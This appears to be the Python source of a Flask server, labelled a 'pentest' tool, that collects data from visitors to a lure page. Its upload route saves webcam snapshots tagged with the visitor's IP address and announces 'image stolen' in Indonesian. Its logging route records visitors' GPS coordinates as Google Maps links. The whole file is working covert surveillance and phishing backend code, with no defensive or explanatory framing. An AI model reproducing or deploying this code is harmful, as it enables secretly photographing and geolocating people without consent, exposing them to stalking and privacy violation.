import os
import socket
import datetime
import base64
import logging
from flask import Flask, request, jsonify, send_from_directory
from colorama import Fore, Style, init

init(autoreset=True)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

LOK_FILE = os.path.join(BASE_DIR, 'lok.txt')
if not os.path.exists(LOK_FILE):
    open(LOK_FILE, 'a').close()

@app.route('/')
def index():
  
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/upload_image', methods=['POST'])
def upload_image():
    data = request.json
    client_ip = request.remote_addr

    if data and 'image' in data:
        img_data_b64 = data['image'].split(',')[1]
        img_binary = base64.b64decode(img_data_b64)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        filename = f"capture_{client_ip}_{timestamp}.png"
        filepath = os.path.join(UPLOAD_DIR, filename)

        with open(filepath, 'wb') as f:
            f.write(img_binary)

        print(
            f"{Fore.RED}GAMBAR DICURI!{Style.RESET_ALL} "
            f"dari {Fore.YELLOW}IP: {client_ip}{Style.RESET_ALL} "
            f"{Fore.GREEN}saved: uploads/{filename}{Style.RESET_ALL}"
        )

        return jsonify({"status": "Image saved"})

    return jsonify({"status": "No image data"}), 400

@app.route('/log_data', methods=['POST'])
def log_data():
    client_ip = request.remote_addr
    data = request.json or {}

    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if not latitude or not longitude:
        return jsonify({"status": "Latitude or Longitude missing"}), 400

    gmaps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

    with open(LOK_FILE, 'a') as f:
        f.write(f"IP: {client_ip} | Maps: {gmaps_link}\n")

    print(
        f"{Fore.CYAN}IP: {client_ip} ---- lokasi: "
        f"{Fore.YELLOW}{gmaps_link}{Style.RESET_ALL}"
    )

    return jsonify({
        "status": "Location logged",
        "maps": gmaps_link
    })

def get_local_network_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except Exception:
        return "Unknown"

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')

    ascii_art = f"""
{Fore.RED} _____         _                              _           _   
|     |___ ___| |_ _ _ ___ ___    ___ ___ ___| |_ ___ ___| |_ 
|   --| .'| . |  _| | |  _| -_|  | . | -_|   |  _| -_|_ -|  _|
|_____|__,|  _|_| |___|_| |___|  |  _|___|_|_|_| |___|___|_|  
          |_|                    |_|  {Fore.YELLOW}-- Flask Server --{Style.RESET_ALL}
"""
    print(ascii_art)

    print(f"{Fore.GREEN}Running on {Fore.YELLOW}http://127.0.0.1:8080{Style.RESET_ALL}")

    network_ip = get_local_network_ip()
    if network_ip != "Unknown" and network_ip != "127.0.0.1":
        print(f"{Fore.GREEN}Network: {Fore.YELLOW}http://{network_ip}:8080{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Gagal mendapatkan IP jaringan{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}Pastikan port 8080 terbuka{Style.RESET_ALL}")

    app.run(host='0.0.0.0', port=8080)
